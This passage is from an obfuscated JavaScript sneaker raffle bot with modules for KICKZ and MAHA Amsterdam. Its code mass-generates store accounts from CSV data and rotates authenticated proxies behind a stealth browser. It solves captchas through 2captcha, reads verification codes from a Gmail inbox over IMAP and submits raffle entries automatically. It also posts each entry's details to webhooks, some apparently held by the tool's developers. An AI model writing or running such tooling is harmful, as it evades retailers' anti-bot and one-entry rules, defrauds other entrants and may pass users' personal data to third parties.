                            await _0x502271['select']('#shoesize', _0x54c987[_0x5129d4 + 0x1]), await _0xbec2fc(0x3e8);
                        } else {
                            const _0x8ac7c0 = await _0x502271['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x39e909 => {
                                return _0x39e909['map'](_0x30339c => _0x30339c['innerText']);
                            }), _0x1c1b64 = await _0x502271['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x57b342 => {
                                return _0x57b342['map'](_0xfc2c99 => _0xfc2c99['value']);
                            });
                            var _0x3d580f = _0xd70e26[_0x34fcda]['Size'];
                            for (var _0x5c56c0 = 0x1; _0x5c56c0 < _0x1c1b64['length']; _0x5c56c0++) {
                                var _0x473f37 = _0x8ac7c0[_0x5c56c0]['split']('\x20')[0x0];
                                if (_0x473f37 == _0x3d580f) {
                                    await _0x502271['select']('#shoesize', _0x1c1b64[_0x5c56c0]);
                                    break;
                                } else {
                                    if (_0x5c56c0 + 0x1 == _0x1c1b64['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x502271['waitForSelector']('#comp_address1'), await _0x502271['type']('#comp_address1', _0xd70e26[_0x34fcda]['Address1'] + '\x20' + _0xd70e26[_0x34fcda]['HouseNumber']), await _0x502271['waitForSelector']('#comp_address2'), await _0x502271['type']('#comp_address2', '' + _0xd70e26[_0x34fcda]['Address2']), await _0x502271['waitForSelector']('#comp_address2'), await _0x502271['type']('#comp_address3', '' + _0xd70e26[_0x34fcda]['City']), await _0x502271['waitForSelector']('#comp_postcode'), await _0x502271['type']('#comp_postcode', '' + _0xd70e26[_0x34fcda]['Zip']), console['log'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20Sending\x20Entry'), await _0xbec2fc(0x4b0), await _0x502271['click']('label#emailhold'), await _0xbec2fc(0x5dc), await _0x502271['click']('#preauth_tandc_email\x20>\x20label'), await _0xbec2fc(0x5dc), await _0x502271['click']('#submit'), await _0x502271['waitForSelector']('#paymentWrap'), console['log'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20' + _0xe1d9e['blue']('Awaiting\x20Paypal\x20Payment')), _0x57af53['on']('targetcreated', async _0x535ffa => {
                            if (_0x535ffa['type']() === 'page') {
                                const _0x51e7a3 = await _0x535ffa['page']();
                                async function _0x3ceedb() {
                                    try {
                                        await _0x502271['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x12fdb6 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x4b67e1() {
                                    try {
                                        await _0x502271['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x162b3d = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x4b67e1(), _0x3ceedb(), await _0xbec2fc(0x493e0);
                            }
                        });
                        async function _0x3741dc() {
                            for (let _0x3fae68 = 0x0; _0x3fae68 < 0x12c; _0x3fae68++) {
                                if (_0x162b3d == !![]) {
                                    _0x4fe352 = 'no', _0x498d8e(_0xd70e26[_0x34fcda], _0x3f0465), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '')
                                        try {
                                            await _0x4f1a4a(_0x1c5a09['webhook'], _0x3524e4['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x3524e4['succesDEVMSG']), await _0xbec2fc(0xc8);
                                    try {
                                        await _0x4f1a4a(_0x53e58f, _0x3524e4['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x12fdb6)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0xbec2fc(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0xbec2fc(0xbb8), await _0x502271['click']('.zoid-outlet'), await _0xbec2fc(0x7d0), await _0x3741dc();
                    } catch (_0x5685da) {
                        console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20' + _0x5685da)), _0x298967 = '' + _0x5685da;
                        var _0x116058 = await _0x597409(_0xd70e26[_0x34fcda], _0x3f0465, 'dev', !![], _0x298967);
                        _0x3524e4['errorDEV'] = { 'embeds': [_0x116058] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x3524e4['errorDEV']), await _0x4f1a4a(_0x166efb, _0x3524e4['errorDEV']);
                    } finally {
                        _0x57af53 && _0x57af53['close']();
                        if (_0x4fe352 == 'yes' && _0x5aafab != 0x5 && _0x298967 != 'Size\x20Not\x20Found') {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x3f0465['name'] + ']\x20Task\x20' + (_0x34fcda + 0x1) + '\x20:\x20Retrying')), _0x34fcda = _0x34fcda - 0x1, _0x5aafab = _0x5aafab + 0x1;
                            continue;
                        }
                        _0x4fe352 == 'yes' && _0x5aafab >= 0x5 && (_0x176a1f(afew[_0x34fcda], _0x3f0465), _0x4fe352 = 'no', _0x5aafab = 0x0), console['log']('Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x339d8a, _0x2e53cd, _0x1895e0, _0xc4d355) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2d4883 = 0x0; _0x2d4883 < _0x1895e0['length']; _0x2d4883++) {
                        if (_0x49a6b4 != 'yes')
                            var _0x49a6b4 = '', _0x21bdc7 = 0x0;
                        _0x2167ba(_0x2e53cd['name'] + '\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20/\x20' + _0x1895e0['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21), await _0x200aab(_0x1895e0, _0x2d4883);
                        var _0x55889e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a8aa
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1c5a09['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x18cd5d
                                }
                            ]
                        }];
                        const _0x36d7d6 = { 'embeds': _0x55889e };
                        var _0x1901d4 = await _0x597409(_0x1895e0[_0x2d4883], _0x2e53cd, 'acc', ![]);
                        const _0x21131d = { 'succesDEVMSG': { 'embeds': [_0x1901d4] } };
                        if (_0x1895e0[_0x2d4883]['Email'] == '' || _0x1895e0[_0x2d4883]['FirstName'] == '' || _0x1895e0[_0x2d4883]['LastName'] == '') {
                            console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x1895e0[_0x2d4883]['Password'] == '' && (_0x1895e0[_0x2d4883]['Password'] = 'JRaffles23!');
                        if (_0x1c5a09['useRandomProxy'] = ![])
                            var _0x37bdda = _0xc4d355[_0x2d4883]['split'](':');
                        else
                            var _0x413574 = Math['round'](Math['random']() * (_0xc4d355['length'] - 0x1)), _0x37bdda = _0xc4d355[_0x413574]['split'](':');
                        const _0x188fc4 = await _0x59f17d['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x37bdda[0x0] + ':' + _0x37bdda[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x48f4a3 = await _0x188fc4['newPage']();
                            await _0x48f4a3['authenticate']({
                                'username': '' + _0x37bdda[0x2],
                                'password': '' + _0x37bdda[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x48f4a3['setRequestInterception'](!![]), _0x48f4a3['on']('request', _0x236ace => {
                                _0x236ace['resourceType']() === 'image' || _0x236ace['resourceType']() === 'font' || _0x236ace['resourceType']() === 'media' ? _0x236ace['abort']() : _0x236ace['continue']();
                            }), await _0x48f4a3['goto'](_0x339d8a), await _0xbec2fc(0xbb8), console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x48f4a3['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x48f4a3['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x48f4a3['waitForSelector']('#button-register'), await _0xbec2fc(0x7d0), await _0x48f4a3['evaluate'](() => {
                                const _0x17d2fc = document['querySelector']('#button-register');
                                _0x17d2fc['click']();
                            }), console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0xbec2fc(0x1388), await _0x48f4a3['waitForSelector']('#customer_salutation'), await _0x48f4a3['select']('#customer_salutation', 'mr'), await _0xbec2fc(0x7d0), await _0x48f4a3['waitForSelector']('#customer_firstname'), await _0x48f4a3['type']('#customer_firstname', '' + _0x1895e0[_0x2d4883]['FirstName']), await _0xbec2fc(0x352), await _0x48f4a3['waitForSelector']('#customer_lastname'), await _0x48f4a3['type']('#customer_lastname', '' + _0x1895e0[_0x2d4883]['LastName']), await _0xbec2fc(0x352), await _0x48f4a3['type']('#email-input', '' + _0x1895e0[_0x2d4883]['Email']), await _0xbec2fc(0x352), await _0x48f4a3['type']('#email-confirm-input', '' + _0x1895e0[_0x2d4883]['Email']), await _0xbec2fc(0x352), await _0x48f4a3['type']('#register-password', '' + _0x1895e0[_0x2d4883]['Password']), await _0xbec2fc(0x352), await _0x48f4a3['type']('#password-confirm', '' + _0x1895e0[_0x2d4883]['Password']), await _0xbec2fc(0x352), console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x48f4a3['click']('#consent'), await _0xbec2fc(0x1f4);
                            const _0x2ac5e9 = await _0x48f4a3['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x2ac5e9) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x48f4a3['click']('#buttonRegister');
                            try {
                                await _0x48f4a3['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x1895e0[_0x2d4883]['Email']), await _0xbec2fc(0x4b0);
                            async function _0x1d9c02() {
                                var _0xf8d040, _0x42ae30 = ![];
                                for (var _0x5d3737 = 0x0; _0x5d3737 < 0x18; _0x5d3737++) {
                                    async function _0x253802() {
                                        var _0x469920 = new _0x1c5c24({
                                            'user': _0x1c5a09['masterMail'],
                                            'password': _0x1c5a09['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x432648(_0xc021fb) {
                                            _0x469920['openBox']('INBOX', ![], _0xc021fb);
                                        }
                                        _0x469920['once']('ready', function () {
                                            console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x432648(function (_0x1c71fe, _0x2cec2e) {
                                                console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x1c71fe)
                                                    throw _0x1c71fe;
                                                _0x469920['seq']['search'](['UNSEEN'], function (_0x3a5efd, _0xf9f1c6) {
                                                    if (!_0xf9f1c6 || !_0xf9f1c6['length'])
                                                        console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x469920['end']();
                                                    else {
                                                        var _0x142169 = _0x469920['seq']['fetch'](_0xf9f1c6, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x142169['on']('message', function (_0x471fcf, _0x54c0ee) {
                                                            var _0x4b5a6a = '(#' + _0x54c0ee + ')\x20';
                                                            _0x471fcf['on']('body', function (_0x5921b5, _0x3c9e07) {
                                                                _0x39d64d(_0x5921b5, (_0x24dbea, _0x4229ea) => {
                                                                    if (_0x4229ea['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x31facb = _0x4229ea['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0xbe7e0e = _0x31facb[0x1]['split']('<')[0x0];
                                                                        _0xf8d040 = _0xbe7e0e;
                                                                    }
                                                                });
                                                            }), _0x471fcf['once']('end', function () {
                                                            });
                                                        }), _0x142169['once']('error', function (_0x4ad078) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x142169['once']('end', function () {
                                                            _0x469920['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x469920['once']('error', function (_0x24c791) {
                                            console['log'](_0xe1d9e['red'](_0x24c791['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x42ae30 = !![];
                                        }), _0x469920['once']('end', async function () {
                                        }), _0x469920['connect']();
                                    }
                                    _0x253802(), await _0xbec2fc(0x1388);
                                    if (_0xf8d040)
                                        return _0xf8d040;
                                    if (_0x42ae30)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x5d3737 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x1d9c02(), _0xbec2fc(0x320), console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Verifying..'), await _0x48f4a3['type']('#verificationCode', code), await _0xbec2fc(0x1f4), await _0x48f4a3['click']('#buttonVerify'), await _0xbec2fc(0x190), await _0x48f4a3['click']('#buttonVerify'), await _0xbec2fc(0x3e8);
                            try {
                                await _0x48f4a3['waitForSelector']('div.b-user_greeting'), _0x49a6b4 = 'no', console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Account\x20' + _0x1895e0[_0x2d4883]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x5b2323['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x1895e0[_0x2d4883]['Email'] + ',' + _0x1895e0[_0x2d4883]['Password'] + ','), console['log'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Account\x20' + _0x1895e0[_0x2d4883]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x21131d['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4f1a4a(_0x540a14, _0x21131d['succesDEVMSG']);
                            } catch {
                                _0x49a6b4 = 'no', console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x2df581) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20' + _0x2df581)), _0x55889e[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x55889e[0x0]['description'] = '' + _0x2df581, await _0x4f1a4a(_0x166efb, _0x36d7d6), _0x49a6b4 = 'yes';
                        } finally {
                            _0x188fc4 && _0x188fc4['close']();
                            if (_0x49a6b4 == 'yes' && _0x21bdc7 != 0x5) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0x2e53cd['name'] + ']\x20Task\x20' + (_0x2d4883 + 0x1) + '\x20:\x20Retrying')), _0x2d4883 = _0x2d4883 - 0x1, _0x21bdc7 = _0x21bdc7 + 0x1;
                                continue;
                            }
                            _0x49a6b4 == 'yes' && _0x21bdc7 >= 0x5 && (_0x176a1f(_0x1895e0[_0x2d4883], _0x2e53cd), _0x49a6b4 = 'no', _0x21bdc7 = 0x0), console['log']('Waiting\x20for\x20' + _0x1c5a09['delay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0xd94708, _0x20642f, _0x4b7a92) {
                    _0x59f17d['use'](_0x1f6810()), _0x59f17d['use'](_0x4d8fa8({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x1c5a09['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5d302a = 0x0; _0x5d302a < _0x20642f['length']; _0x5d302a++) {
                        var _0x509c1b;
                        if (_0x53df8e != 'yes')
                            var _0x53df8e = '', _0x41ed43 = 0x0;
                        _0x2167ba(_0xd94708['name'] + '\x20Task\x20' + (_0x5d302a + 0x1) + '\x20/\x20' + _0x20642f['length'] + '\x20||\x20File:\x20' + _0x5f3c92 + '\x20Proxies:\x20' + _0x3e3b21);
                        var _0x2696b7 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x50a8aa
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x20642f[_0x5d302a]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x20642f[_0x5d302a]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x1c5a09['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x18cd5d
                                }
                            ]
                        }], _0x29dc37 = await _0x597409(_0x20642f[_0x5d302a], _0xd94708, 'dev', ![]), _0xd15a77 = await _0x597409(_0x20642f[_0x5d302a], _0xd94708, 'pub', ![]);
                        const _0x5ef956 = {
                            'succesDEVMSG': { 'embeds': [_0x29dc37] },
                            'succesPUBMSG': { 'embeds': [_0xd15a77] }
                        };
                        await _0x200aab(_0x20642f, _0x5d302a);
                        if (_0x20642f[_0x5d302a]['Email'] == '' || _0x20642f[_0x5d302a]['Password'] == '' || _0x20642f[_0x5d302a]['FirstName'] == '' || _0x20642f[_0x5d302a]['LastName'] == '') {
                            console['log'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x1c5a09['useRandomProxy'] = ![])
                            var _0xb1d347 = _0x4b7a92[_0x5d302a]['split'](':');
                        else
                            var _0x5a38a0 = Math['round'](Math['random']() * (_0x4b7a92['length'] - 0x1)), _0xb1d347 = _0x4b7a92[_0x5a38a0]['split'](':');
                        const _0x45e95c = await _0x59f17d['launch']({
                            'headless': ![],
                            'args': [
                                '--proxy-server=' + _0xb1d347[0x0] + ':' + _0xb1d347[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x428434 = await _0x45e95c['newPage']();
                            await _0x428434['authenticate']({
                                'username': '' + _0xb1d347[0x2],
                                'password': '' + _0xb1d347[0x3]
                            }), console['log'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Getting\x20Session'), await _0x428434['setRequestInterception'](!![]), _0x428434['on']('request', _0x3abf65 => {
                                _0x3abf65['resourceType']() === 'image' || _0x3abf65['resourceType']() === 'font' || _0x3abf65['resourceType']() === 'media' ? _0x3abf65['abort']() : _0x3abf65['continue']();
                            }), await _0x428434['goto']('' + _0x20642f[_0x5d302a]['Url'], { 'waitUntil': 'networkidle2' }), await _0xbec2fc(0x12c);
                            try {
                                await _0x428434['click']('a[title=\x22Sign\x20In\x22]');
                            } catch {
                                await _0x428434['click']('a[title=\x22sign\x20in\x22]');
                            }
                            console['log'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Logging\x20in'), await _0x428434['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x428434['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x428434['waitForSelector']('#username'), await _0x428434['type']('#username', _0x20642f[_0x5d302a]['Email']), await _0x428434['waitForSelector']('#password'), await _0x428434['type']('#password', _0x20642f[_0x5d302a]['Password']), await _0xbec2fc(0x190), await _0x428434['click']('#buttonSubmit'), await _0x428434['waitForSelector']('div.b-user_greeting'), console['log'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Getting\x20Product'), await _0xbec2fc(0x1f4), await _0x428434['goto']('' + _0x20642f[_0x5d302a]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x20642f[_0x5d302a]['Size']);
                            let _0x6ca823 = _0x20642f[_0x5d302a]['Size']['replace']('.5', '\x201/2');
                            await _0x428434['click']('button[title=\x22' + _0x6ca823 + '\x22]'), await _0xbec2fc(0x1f4);
                            try {
                                await _0x428434['click']('button[data-tau=\x22add_new_address\x22]');
                            } catch {
                            }
                            await _0xbec2fc(0x12c), console['log'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Filling\x20Information'), await _0x428434['select']('#dwfrm_raffle_addressFields_salutation', 'mr'), await _0xbec2fc(0x12c), await _0x428434['type']('#dwfrm_raffle_addressFields_firstName', _0x20642f[_0x5d302a]['FirstName']), await _0xbec2fc(0x12c), await _0x428434['type']('#dwfrm_raffle_addressFields_lastName', _0x20642f[_0x5d302a]['LastName']), await _0xbec2fc(0x12c), await _0x428434['select']('#dwfrm_raffle_addressFields_country', _0x20642f[_0x5d302a]['Country']), await _0xbec2fc(0x12c), await _0x428434['type']('#dwfrm_raffle_addressFields_city', _0x20642f[_0x5d302a]['City']), await _0xbec2fc(0x12c);
                            _0x20642f[_0x5d302a]['Postcode'] == undefined && (_0x20642f[_0x5d302a]['Postcode'] = _0x20642f[_0x5d302a]['Zip']);
                            await _0x428434['type']('#dwfrm_raffle_addressFields_postalCode', _0x20642f[_0x5d302a]['Postcode']), await _0xbec2fc(0x12c), await _0x428434['type']('#dwfrm_raffle_addressFields_address1', _0x20642f[_0x5d302a]['Address1']), await _0xbec2fc(0x12c), await _0x428434['type']('#dwfrm_raffle_addressFields_address2', _0x20642f[_0x5d302a]['HouseNumber']), await _0xbec2fc(0x12c), await _0x428434['type']('#dwfrm_raffle_addressFields_additionalAddressInfo', _0x20642f[_0x5d302a]['Address2']), await _0xbec2fc(0x12c), await _0x428434['click']('#dwfrm_raffle_addressFields_saveAddress'), await _0xbec2fc(0x12c), await _0x428434['type']('#dwfrm_raffle_raffleSpecificFields_instagramAccount', _0x20642f[_0x5d302a]['Follower']), await _0xbec2fc(0x1f4), await _0x428434['click']('#dwfrm_raffle_raffleSpecificFields_consentOnConditions'), await _0xbec2fc(0x1f4), console['log'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20' + _0xe1d9e['blue']('Awaiting\x20Paypal\x20Payment')), await _0x428434['click']('.b-paypal_button');
                            try {
                                await _0x428434['waitForSelector']('.b-raffle-message.m-success', { 'timeout': 0x493e0 }), _0x53df8e = 'no', _0x498d8e(_0x20642f[_0x5d302a], _0xd94708), console['log'](_0xe1d9e['green'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x5ef956['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x5df164, _0x5ef956['succesDEVMSG']), await _0xbec2fc(0xc8), await _0x4f1a4a(_0x53e58f, _0x5ef956['succesPUBMSG']);
                            } catch (_0x4300cb) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Paypal\x20Error:\x20' + _0x4300cb)), _0x509c1b = 'Error\x20while\x20entering\x20Paypal:\x20' + _0x4300cb;
                                var _0xfdb282 = await _0x597409(_0x20642f[_0x5d302a], _0xd94708, 'dev', !![], _0x509c1b);
                                _0x5ef956['errorDEV'] = { 'embeds': [_0xfdb282] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x5ef956['errorDEV']), await _0x4f1a4a(_0x166efb, _0x5ef956['errorDEV']);
                            }
                        } catch (_0x110782) {
                            console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20' + _0x110782)), _0x509c1b = '' + _0x110782;
                            var _0xfdb282 = await _0x597409(_0x20642f[_0x5d302a], _0xd94708, 'dev', !![], _0x509c1b);
                            _0x5ef956['errorDEV'] = { 'embeds': [_0xfdb282] }, _0x1c5a09['webhook'] != undefined && _0x1c5a09['webhook'] != '' && await _0x4f1a4a(_0x1c5a09['webhook'], _0x5ef956['errorDEV']), await _0x4f1a4a(_0x166efb, _0x5ef956['errorDEV']), _0x53df8e = 'yes';
                        } finally {
                            _0x45e95c && _0x45e95c['close']();
                            if (_0x53df8e == 'yes' && _0x41ed43 != 0x5) {
                                console['log'](_0xe1d9e['red'](_0x27df86() + '\x20[' + _0xd94708['name'] + ']\x20Task\x20' + (_0x5d302a + 0x1) + '\x20:\x20Retrying')), _0x5d302a = _0x5d302a - 0x1, _0x41ed43 = _0x41ed43 + 0x1;
                                continue;
                            }
                            _0x53df8e == 'yes' && _0x41ed43 >= 0x5 && (_0x176a1f(_0x20642f[_0x5d302a], _0xd94708), _0x53df8e = 'no', _0x41ed43 = 0x0), console['log']('Waiting\x20for\x20' + _0x1c5a09['AfewDelay'] + '\x20ms'), await _0xbec2fc(_0x1c5a09['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
